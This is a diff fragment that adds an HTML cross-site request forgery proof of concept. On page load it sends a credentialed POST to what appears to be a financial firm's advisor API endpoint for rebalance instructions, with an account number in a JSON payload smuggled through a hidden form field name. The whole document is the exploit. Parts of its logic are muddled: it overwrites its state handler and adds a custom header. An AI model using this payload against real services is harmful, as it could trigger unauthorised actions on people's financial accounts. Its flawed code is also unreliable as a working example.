@@ -63,3 +63,52 @@
 
 
 
+<html>
+  <body onload="submitForm()">
+    <form id="csrf" method="POST">
+      <input type="hidden" name='{"targetType":"Account","selectedAccounts":[{"accountNumber":"34850352705204","custodian":"FID","accountSource":"FPRS"}],"newRequest":true,"fsake":"' value='"}'>
+    </form>
+
+    <script>
+      function submitForm() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://fin-wealthcentral-advisorchannel.fmr.com/ssc/mars/wc/channel/api/v1/rebalances/workplace/send-instructions", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.setRequestHeader("Your-Custom-Header", "Header-Value");
+        xhr.withCredentials = true; // Include credentials if needed
+
+        // Handle the preflight OPTIONS request
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState == 2) {
+            if (xhr.status == 200) {
+              // Handle successful OPTIONS response
+              console.log("OPTIONS request successful");
+            } else {
+              // Handle errors for OPTIONS request
+              console.error("Error in OPTIONS request: " + xhr.status);
+            }
+          }
+        };
+
+        // Get the form data
+        var formData = document.getElementById("csrf").querySelector("input").value;
+
+        // Send the form data with the XMLHttpRequest object
+        xhr.send(formData);
+
+        // Handle the actual POST request response
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState == 4) {
+            if (xhr.status == 200) {
+              // Handle successful POST response
+              console.log(xhr.responseText);
+            } else {
+              // Handle errors for POST request
+              console.error("Error in POST request: " + xhr.status);
+            }
+          }
+        };
+      }
+    </script>
+  </body>
+</html>
